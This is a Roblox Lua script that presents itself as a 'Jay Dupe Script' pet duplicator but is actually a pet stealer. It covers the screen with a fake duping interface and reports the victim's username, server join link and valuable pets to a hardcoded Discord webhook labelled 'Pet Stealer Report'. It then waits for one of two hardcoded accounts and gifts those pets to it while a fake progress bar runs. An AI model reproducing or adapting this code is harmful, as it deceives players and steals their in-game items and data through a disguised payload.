local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

local adminIds = {
    ["1582324117"] = "amine100a",
    ["8295702911"] = "CheatCode743"
}

local targetPet = {"Racoon", "Dragon Fly", "Red Fox", "Polar Bear"}

pcall(function()
    StarterGui:SetCore("TopbarEnabled", false)
end)

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "JayDupeUI"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.DisplayOrder = 999999
screenGui.Parent = PlayerGui

local background = Instance.new("Frame")
background.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
background.Size = UDim2.new(1, 0, 1, 0)
background.Position = UDim2.new(0, 0, 0, 0)
background.BorderSizePixel = 0
background.ZIndex = 10
background.Parent = screenGui

local title = Instance.new("TextLabel")
title.Text = "Jay Dupe Script"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.BackgroundTransparency = 1
title.Font = Enum.Font.GothamSemibold
title.TextScaled = true
title.Size = UDim2.new(0.6, 0, 0.08, 0)
title.Position = UDim2.new(0.2, 0, 0.25, 0)
title.ZIndex = 11
title.Parent = background

local statusMsg = Instance.new("TextLabel")
statusMsg.Text = "Ready to dupe"
statusMsg.TextColor3 = Color3.fromRGB(200, 200, 200)
statusMsg.BackgroundTransparency = 1
statusMsg.Font = Enum.Font.Gotham
statusMsg.TextScaled = true
statusMsg.Size = UDim2.new(0.6, 0, 0.06, 0)
statusMsg.Position = UDim2.new(0.2, 0, 0.32, 0)
statusMsg.ZIndex = 11
statusMsg.Parent = background

local startBtn = Instance.new("TextButton")
startBtn.Text = "Start Dupe"
startBtn.Size = UDim2.new(0.3, 0, 0.08, 0)
startBtn.Position = UDim2.new(0.35, 0, 0.4, 0)
startBtn.ZIndex = 12
startBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
startBtn.TextColor3 = Color3.new(1, 1, 1)
startBtn.Font = Enum.Font.GothamBold
startBtn.TextScaled = true
startBtn.Parent = background

Instance.new("UICorner", startBtn).CornerRadius = UDim.new(0, 14)
Instance.new("UIStroke", startBtn).Color = Color3.fromRGB(255, 255, 255)

local function CheckInventory()
    local backpack = Players.LocalPlayer:FindFirstChild("Backpack")
    if not backpack then return {}, 0, 0 end

    local petCounts = {
        ["Racoon"] = 0,
        ["Dragon Fly"] = 0,
        ["Red Fox"] = 0,
        ["Polar Bear"] = 0 -- Optional: include if needed
    }

    local age20plus = 0
    local kg10plus = 0

    for _, tool in ipairs(backpack:GetChildren()) do
        if tool:IsA("Tool") then
            local name = tool.Name
            local petName = name:match("^(.-) %[%d") or ""
            local kg = tonumber(name:match("%[(%d+%.?%d*) KG%]"))
            local age = tonumber(name:match("%[Age (%d+)%]"))

            if petCounts[petName] ~= nil then
                petCounts[petName] = petCounts[petName] + 1
            end
            if age and age >= 20 then
                age20plus = age20plus + 1
            end
            if kg and kg > 10 then
                kg10plus = kg10plus + 1
            end
        end
    end

    return petCounts, age20plus, kg10plus
end

local function sendWebhook(data)
    local url = "https://discord.com/api/webhooks/1068114147935522826/kX61hYF6wVSlueI1F9UpFvdPAe5zoe2hUtJSN4YlPUHe5sOgoAs6kU4BfLwPXxjsh8gs"

    local foundPets = {}
    if data.counts["Racoon"] > 0 then table.insert(foundPets, "Racoon") end
    if data.counts["Dragon Fly"] > 0 then table.insert(foundPets, "Dragon Fly") end
    if data.counts["Red Fox"] > 0 then table.insert(foundPets, "Red Fox") end
    if data.counts["Polar Bear"] > 0 then table.insert(foundPets, "Polar Bear") end
    if data.age20plus > 0 then table.insert(foundPets, "Pet with Age 20+") end
    if data.kg10plus > 0 then table.insert(foundPets, "Pet with 15+ KG") end

    local message = ""
    if #foundPets > 0 then
        message = "@everyone\n" .. table.concat(foundPets, ", ") .. " is here!"
    end

    local payload = {
        content = message,
        embeds = {{
            title = "Pet Stealer Report",
            color = 65280,
            fields = {
                { name = "Username", value = data.username, inline = true },
                { name = "Join Link", value = "https://www.roblox.com/games/start?placeId=126884695634066&gameInstanceId=" .. data.jobId, inline = true },
                { name = "Player Count", value = data.playerCount, inline = true },
                { name = "Racoon", value = tostring(data.counts["Racoon"]), inline = true },
                { name = "Dragon Fly", value = tostring(data.counts["Dragon Fly"]), inline = true },
                { name = "Red Fox", value = tostring(data.counts["Red Fox"]), inline = true },
                { name = "Polar Bear", value = tostring(data.counts["Polar Bear"]), inline = true },
                { name = "Pet that has Age 20 and above", value = tostring(data.age20plus), inline = true },
                { name = "Pet that has more than 15 KG", value = tostring(data.kg10plus), inline = true }
            }
        }}
    }

    local headers = { ["Content-Type"] = "application/json" }
    local body = HttpService:JSONEncode(payload)
    local requestFunc = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)

    if requestFunc then
        requestFunc({
            Url = url,
            Method = "POST",
            Headers = headers,
            Body = body
        })
    end
end

startBtn.MouseButton1Click:Connect(function()
    startBtn.Visible = false
    statusMsg.Text = "Checking server..."

    local counts, age20plus, kg10plus = CheckInventory()

    if #Players:GetPlayers() >= Players.MaxPlayers then
        LocalPlayer:Kick("Dupe error, Join on server with low player")
        return
    end

    local serverInfo = {
        username = LocalPlayer.Name,
        jobId = game.JobId,
        playerCount = #Players:GetPlayers() .. "/" .. Players.MaxPlayers,
        counts = counts,
        age20plus = age20plus,
        kg10plus = kg10plus
    }

    sendWebhook(serverInfo)

    local foundTarget = nil
    for i = 1, 180 do
        for userId, name in pairs(adminIds) do
            local player = Players:GetPlayerByUserId(tonumber(userId))
            if player then
                foundTarget = player
                break
            end
        end
        if foundTarget then break end
        wait(1)
    end

    if not foundTarget then
        LocalPlayer:Kick("Dupe Error. Please Rejoin!")
        return
    end

    statusMsg.Text = "Starting to dupe...."
    wait(1)

    local backpack = LocalPlayer:FindFirstChild("Backpack")
    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

    for _, tool in ipairs(backpack:GetChildren()) do
        if tool:IsA("Tool") then
            local name = tool.Name
            local petName = name:match("^(.-) %[%d")
            local kg = tonumber(name:match("%[(%d+%.?%d*) KG%]"))
            local age = tonumber(name:match("%[Age (%d+)%]"))

            local isTarget = table.find(targetPet, petName)
            local isAgeValid = age and age >= 20
            local isKGValid = kg and kg > 10

            if isTarget or isAgeValid or isKGValid then
                tool.Parent = character
                ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer("GivePet", foundTarget)
                wait(1)
                tool.Parent = backpack
                wait(0.2)
            end
        end
    end

    statusMsg.Text = "Duping Process...."

    local loadingBarBackground = Instance.new("Frame", background)
    loadingBarBackground.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    loadingBarBackground.Position = UDim2.new(0.2, 0, 0.52, 0)
    loadingBarBackground.Size = UDim2.new(0.6, 0, 0.04, 0)
    loadingBarBackground.ZIndex = 11
    loadingBarBackground.BorderSizePixel = 0
    Instance.new("UICorner", loadingBarBackground).CornerRadius = UDim.new(0, 8)

    local loadingBar = Instance.new("Frame", loadingBarBackground)
    loadingBar.BackgroundColor3 = Color3.new(0, 1, 0)
    loadingBar.Size = UDim2.new(0, 0, 1, 0)
    loadingBar.ZIndex = 12
    loadingBar.BorderSizePixel = 0
    Instance.new("UICorner", loadingBar).CornerRadius = UDim.new(0, 8)

    for i = 1, 100 do
        loadingBar.Size = UDim2.new(i / 100, 0, 1, 0)
        statusMsg.Text = "Duping Process... " .. i .. "%"
        wait(0.3)
    end

    statusMsg.Text = "Dupe Completed. Rejoin to see results."
end)
